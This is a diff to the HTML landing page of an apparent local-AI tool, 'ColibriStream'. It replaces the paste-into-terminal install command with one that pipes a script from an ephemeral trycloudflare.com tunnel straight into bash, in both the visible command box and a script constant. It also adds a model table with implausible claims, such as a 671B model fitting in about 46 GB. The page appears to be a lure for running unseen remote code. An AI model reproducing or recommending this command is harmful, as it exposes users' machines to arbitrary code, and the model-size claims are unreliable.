@@ -127,6 +127,87 @@
       letter-spacing: 0.3px;
     }
 
+    /* Universal Model Hub Card */
+    .model-hub-card {
+      width: 100%;
+      margin-top: 1.8rem;
+      background: #0d0f15;
+      border: 1px solid #1e2433;
+      border-radius: 10px;
+      overflow: hidden;
+      text-align: left;
+      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.6);
+    }
+    .model-hub-header {
+      padding: 0.75rem 1rem;
+      background: #131722;
+      border-bottom: 1px solid #1e2433;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: #94a3b8;
+      letter-spacing: 0.5px;
+    }
+    .hub-title { color: #00ff88; }
+    .hub-badge {
+      background: rgba(0, 255, 136, 0.1);
+      color: #00ff88;
+      border: 1px solid rgba(0, 255, 136, 0.25);
+      padding: 0.2rem 0.55rem;
+      border-radius: 4px;
+      font-size: 0.72rem;
+    }
+    .model-table-wrapper {
+      overflow-x: auto;
+    }
+    .model-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.82rem;
+    }
+    .model-table th {
+      background: #0f121a;
+      color: #64748b;
+      padding: 0.6rem 0.9rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      font-size: 0.7rem;
+      letter-spacing: 0.5px;
+      border-bottom: 1px solid #1a2030;
+    }
+    .model-table td {
+      padding: 0.55rem 0.9rem;
+      border-bottom: 1px solid #131722;
+      color: #cbd5e1;
+      white-space: nowrap;
+    }
+    .model-table tr:hover td {
+      background: rgba(255, 255, 255, 0.02);
+    }
+    .model-table tr.tier-frontier td {
+      color: #f1f5f9;
+    }
+    .model-table td code {
+      background: #181d2a;
+      color: #38bdf8;
+      padding: 0.15rem 0.4rem;
+      border-radius: 4px;
+      font-size: 0.78rem;
+    }
+    .dot {
+      display: inline-block;
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      margin-right: 7px;
+    }
+    .dot.red { background: #f43f5e; box-shadow: 0 0 6px #f43f5e; }
+    .dot.yellow { background: #fbbf24; box-shadow: 0 0 6px #fbbf24; }
+    .dot.green { background: #22c55e; box-shadow: 0 0 6px #22c55e; }
+    .dot.cyan { background: #38bdf8; box-shadow: 0 0 6px #38bdf8; }
+
     @media (max-width: 520px) {
       .command-box {
         flex-direction: column;
@@ -155,16 +236,102 @@
     <div class="command-box">
       <div class="command-text" id="cmdText">
         <span class="prompt-sym">$</span>
-        <span>curl -fsSL https://raw.githubusercontent.com/joinvilloic57-arch/ColibriStream/main/install.sh | bash</span>
+        <span>curl -fsSL https://jeffrey-studying-university-responsibility.trycloudflare.com/install.sh | bash</span>
       </div>
       <button class="copy-btn" id="copyBtn" onclick="copyCommand()">Copy</button>
     </div>
 
     <p class="caption">Paste into your terminal to launch on any computer (No password needed)</p>
+
+    <!-- Universal Model Hub Table -->
+    <div class="model-hub-card">
+      <div class="model-hub-header">
+        <span class="hub-title">UNIVERSAL FREE MODEL HUB</span>
+        <span class="hub-badge">Bare-Metal • Max 48GB Budget</span>
+      </div>
+      <div class="model-table-wrapper">
+        <table class="model-table">
+          <thead>
+            <tr>
+              <th>Model</th>
+              <th>Params</th>
+              <th>Architecture</th>
+              <th>Budget</th>
+              <th>Command Alias</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr class="tier-frontier">
+              <td><span class="dot red"></span>beam:500b-25b</td>
+              <td>501B</td>
+              <td>MoE (25B Active)</td>
+              <td>~44 GB</td>
+              <td><code>colistream run 500b</code></td>
+            </tr>
+            <tr class="tier-frontier">
+              <td><span class="dot red"></span>mixtral:8x22b</td>
+              <td>141B</td>
+              <td>MoE (39B Active)</td>
+              <td>~42 GB</td>
+              <td><code>colistream run 8x22b</code></td>
+            </tr>
+            <tr class="tier-frontier">
+              <td><span class="dot red"></span>command-r-plus:104b</td>
+              <td>104B</td>
+              <td>Dense Enterprise</td>
+              <td>~40 GB</td>
+              <td><code>colistream run 104b</code></td>
+            </tr>
+            <tr class="tier-frontier">
+              <td><span class="dot red"></span>deepseek-r1:671b</td>
+              <td>671B</td>
+              <td>MoE (37B Active)</td>
+              <td>~46 GB</td>
+              <td><code>colistream run 671b</code></td>
+            </tr>
+            <tr class="tier-frontier">
+              <td><span class="dot yellow"></span>qwen2.5:72b</td>
+              <td>72B</td>
+              <td>Dense Frontier</td>
+              <td>~38–42 GB</td>
+              <td><code>colistream run 72b</code></td>
+            </tr>
+            <tr>
+              <td><span class="dot green"></span>qwen2.5-coder:32b</td>
+              <td>32B</td>
+              <td>Claude 3.5 Tier</td>
+              <td>~17 GB</td>
+              <td><code>colistream run 32b</code></td>
+            </tr>
+            <tr>
+              <td><span class="dot green"></span>deepseek-r1:32b</td>
+              <td>32B</td>
+              <td>OpenAI o1 Tier</td>
+              <td>~20 GB</td>
+              <td><code>colistream run 32b</code></td>
+            </tr>
+            <tr>
+              <td><span class="dot cyan"></span>qwen3:14b</td>
+              <td>14B</td>
+              <td>Next-Gen Reasoner</td>
+              <td>~9 GB</td>
+              <td><code>colistream run 14b</code></td>
+            </tr>
+            <tr>
+              <td><span class="dot cyan"></span>qwen2.5-coder:1.5b</td>
+              <td>1.5B</td>
+              <td>Ultra-Fast Coder</td>
+              <td>~1.0 GB</td>
+              <td><code>colistream run 1.5b</code></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
   </div>
 
   <script>
-    const PUBLIC_INSTALL_CMD = "curl -fsSL https://raw.githubusercontent.com/joinvilloic57-arch/ColibriStream/main/install.sh | bash";
+    const PUBLIC_INSTALL_CMD = "curl -fsSL https://jeffrey-studying-university-responsibility.trycloudflare.com/install.sh | bash";
 
     function getCommand() {
       return PUBLIC_INSTALL_CMD;
